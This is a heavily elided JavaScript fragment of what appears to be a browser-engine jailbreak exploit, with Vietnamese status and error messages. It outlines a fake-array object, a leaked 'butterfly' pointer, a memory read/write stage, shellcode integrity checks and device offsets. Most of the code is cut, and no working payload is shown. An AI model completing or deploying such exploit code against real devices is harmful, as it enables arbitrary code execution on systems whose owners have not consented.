...
var pwn = function(){
    ...
    if (fakeDoubleArr == undefined) {
        throw new Error("Khai thác thất bại: không thể sinh đôi giả.");
    }
    ...
    if(magicIdx.toString(16) == '0') throw new Error("butterfly Không bị rò rỉ");

    
    let rw = new stage1(boxed, unboxed, magicIdx);
    
    if(!rw.test()) throw new Error("Có vẻ như chúng ta đạt được r/w.");
...
function check_integrity(buffer){
    ...
    if(CONFIG.INTEGRITY_CHECKS_ENABLED) {
        ...
        {
            throw new Error('Kiểm tra tính toàn vẹn Shellcode không thành công.');
        } else {
            print('Kiểm tra tính toàn vẹn Shellcode đã được thông qua!');
        }
    } else {
        print("Hashes: "+
            JSON.stringify(
...
{
    (persistantwriter.read() || print("Không có nhật ký trước nào, có thể là lần đầu tiên jailbreaking!"));
    persistantwriter.clear();
    if(!window.chosendevice.offsets) print("Vì một số lý do bù trừ bị thiếu, hãy tiếp tục ...");
    _off = window.chosendevice.offsets;

    print("Khai thác đã được gọi và đang chờ shellcode.");
